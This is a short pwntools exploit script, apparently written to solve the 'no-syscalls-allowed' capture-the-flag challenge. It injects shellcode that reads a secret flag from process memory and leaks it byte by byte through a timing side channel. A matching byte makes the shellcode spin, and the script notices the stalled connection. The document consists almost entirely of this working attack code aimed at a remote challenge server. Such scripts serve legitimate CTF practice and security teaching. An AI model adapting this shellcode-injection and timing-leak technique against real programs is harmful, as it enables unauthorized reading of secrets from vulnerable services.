from pwn import *
import string

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)

gs = '''
b *$rebase(0x1206)
b *$rebase(0x121b)
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    else:
        return process(e.path, level='error')


def try_letter(pos, byte):
    p = start()

    shell = asm("""
    push rbx            /* libc_csu_init */
    pop r10
    add r10, 0x2e50     /* flag */
    push [r10]          /* push flag to stack */
    loop: 
      xor   r11, r11
      mov   r11b, byte [rsp-0x1+%i] 
      cmp   r11, %i                 
      je loop          /* if equal, loop forever */
     
    """ % (pos, byte))
    p.sendline(shell)
    time.sleep(1)

    try:
        p.recvline(timeout=0.01)
        log.warn('Matched %i at position %i' % (byte,pos))
        return True
    except Exception as e:
        return False

flag = ''

while (True):
    for pos in range(0, 100):
        for letter in string.printable:
            if (try_letter(pos, ord(letter))):
                flag += letter
                print('Flag Updated: %s' % flag)
                break
        if '}' in flag:
            break

print('Flag: %s' % flag)
